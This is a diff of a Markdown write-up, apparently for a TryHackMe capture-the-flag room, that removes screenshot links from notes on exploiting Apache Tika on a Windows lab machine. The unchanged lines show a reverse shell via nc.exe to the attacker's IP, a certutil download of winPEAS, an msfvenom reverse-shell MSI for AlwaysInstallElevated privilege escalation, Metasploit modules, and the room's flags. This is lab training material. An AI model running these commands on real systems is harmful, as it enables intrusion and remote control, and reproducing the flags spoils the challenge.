@@ -25,14 +25,12 @@ then we run the exploit again
 ``python3 exploit.py 10.65.176.182 61777 "C:/Users/Public/nc.exe 10.65.67.67 4443 -e cmd.exe"``
 _Note: The direction of the slashes matters. Keep things like this in mind when an exploit is mysteriously failing._
 - We now have a shell!
-![[Screenshot 2026-01-07 at 6.47.55 PM.png]]
 ### Post Exploitation Method #1
 - Navigate to the cyberlens user's Desktop to view the _user.txt_ flag.
 ### Privilege Escalation Method #1
 - Since we want to look for privesc vectors, we need to upload winPEAS.exe (x86) to the remote box. Once again we'll host the file on a python3 server and transfer it to the remote host with:
 ``certutil -urlcache -f http://10.65.67.67:8000/winPEAS.exe C:\Users\CyberLens\Desktop\winPEAS.exe``
 - Once we run winPEAS, we notice that AlwaysInstallElevated is set to 1
-![[Screenshot 2026-01-07 at 7.13.36 PM.png]]
 [Info here](https://dmcxblue.gitbook.io/red-team-notes/privesc/unquoted-service-path)
 - We will craft a msfvenom reverse shell payload
 ``msfvenom --platform windows --arch x64 --payload windows/x64/shell_reverse_tcp LHOST=10.65.67.67 LPORT=1337 --encoder x64/xor --iterations 9 --format msi --out AlwaysInstallElevated.msi``
@@ -41,7 +39,6 @@ and transfer it to the remote host
 - There is a special command to execute this file:
 **``msiexec /quiet /qn /i AlwaysInstallElevated.msi``**
 We are root!
-![[Screenshot 2026-01-07 at 7.28.36 PM.png]]
 ### Exploitation Method #2
 - We can just use a metasploit module: ``exploit/windows/http/apache_tika_jp2_jscript``
 - Simply set the SRVHOST to our local IP and RHOSTS to our victim machine. Also set RPORT in this case to 61777 as discovered in our nmap scan.
@@ -53,7 +50,6 @@ We are root!
 		_post/multi/recon/local_exploit_suggester_	
 - The exploit suggester will recommend the _exploit/windows/local/always_install_elevated_ exploit after it finishes running.
 - We simply select it, set our session, and run.
-![[Screenshot 2026-01-07 at 7.43.00 PM.png]]
 ### Flags
 - User: _THM{T1k4-CV3-f0r-7h3-w1n}_
 - Root: _THM{3lev@t3D-4-pr1v35c!}_
